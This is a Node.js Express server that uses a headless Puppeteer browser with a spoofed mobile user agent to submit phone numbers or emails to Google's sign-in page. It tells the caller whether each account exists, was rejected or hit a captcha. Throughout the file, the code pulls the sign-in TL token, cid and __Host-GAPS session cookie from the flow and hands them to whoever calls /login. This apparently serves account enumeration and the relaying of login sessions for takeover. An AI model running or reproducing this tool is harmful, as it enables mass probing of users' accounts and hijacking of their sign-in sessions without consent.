const bodyParser = require('body-parser')
const puppeteer = require('puppeteer')
const express = require('express')
const http = require('http')

const app = express()

app.use(express.json())
app.use(bodyParser.urlencoded({ extended: true }))

const server = http.createServer(app)

server.listen(process.env.PORT || 3000, ()=>{
    console.log("Listening on port: "+(process.env.PORT || 3000))
})

let signIn = 'https://accounts.google.com/v3/signin/identifier?dsh=S940062189%3A1665260575698599&continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQDHYWp7Xws8OWDo__8vSPkkEImpDwna2RbBmEUp7Wfl7GpYaoWHAtWPfHfSSX-zonF0xYJnZ7HWlw&hl=en-US'

let browser = null

;(async () => {

    browser = await puppeteer.launch({
        headless: true,
        args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
    })

    console.log('Success')

})()

async function loginToken(connection, number) {
    let mCaptcha = false
    let mTimer = null
    
    let page = await browser.newPage()

    await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')

    page.on('request', async (req) => {
        let url = req.url
        //console.log(url)
        if(url.includes('source-path=%2Fv3%2Fsignin%2Frejected')) {
            try {
                if(mTimer != null) clearTimeout(mTimer)
                page.close()
            } catch (e) {}
            if(connection) {
                connection.end('Reject')
            }
            console.log('Reject')
        } else if(url.startsWith('https://accounts.google.com/Captcha')) {
            if(!mCaptcha) {
                mCaptcha = true
                try {
                    if(mTimer != null) clearTimeout(mTimer)
                    page.close()
                } catch (e) {}
                if(connection) {
                    connection.end('Captcha')
                }
                console.log('Captcha')
            }
        } else if(url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
            mCaptcha = false
            mTimer = setTimeout(async () => {
                let error = await page.evaluate(() => {
                    let error = document.querySelector('div.o6cuMc')
                    if(error != null && error.innerText.startsWith('Couldn\'t find your Google Account')) {
                        return true
                    }
                    return false
                })
                if(error) {
                    try {
                        if(mTimer != null) clearTimeout(mTimer)
                        page.close()
                    } catch (e) {}
                    if(connection) {
                        connection.end('Not Found')
                    }
                    console.log('Not Found')
                }
            }, 1500)
        } else if(url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=jfk2af')) {
            let pageUrl = await page.evaluate(() => window.location.href)
            let tl = 'null'
            let gps = 'null'
            let cid = '1'
            let index = pageUrl.indexOf('TL=')
            if(index != -1) {
                tl = pageUrl.substring(index+3, pageUrl.length).split('&')[0]
                index = pageUrl.indexOf('cid=')
                if(index != -1) {
                    cid = pageUrl.substring(index+4, pageUrl.length).split('&')[0]
                }
                let cookie = await page.cookies()
                cookie.forEach(function (value) {
                    if (value.name == '__Host-GAPS') {
                        gps = value.value
                    }
                })
            }
            try {
                if(mTimer != null) clearTimeout(mTimer)
                page.close()
            } catch (e) {}
            if(connection) {
                connection.end(tl+'★'+gps+'★'+cid)
            }
            console.log(tl, cid)
        }
    })

    await page.goto(signIn+'#Email='+number)
    await page.evaluate(() => document.querySelector('#identifierNext').click())
}

app.post('/login', async function (req, res) {
    if(req.body) {
        if(req.body.number) {
            if(browser != null) {
                await loginToken(res, req.body.number)
            } else {
                res.end('null')
            }
        } else {
            res.end('error')
        }
    } else {
        res.end('error')
    }
})

function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    })
}
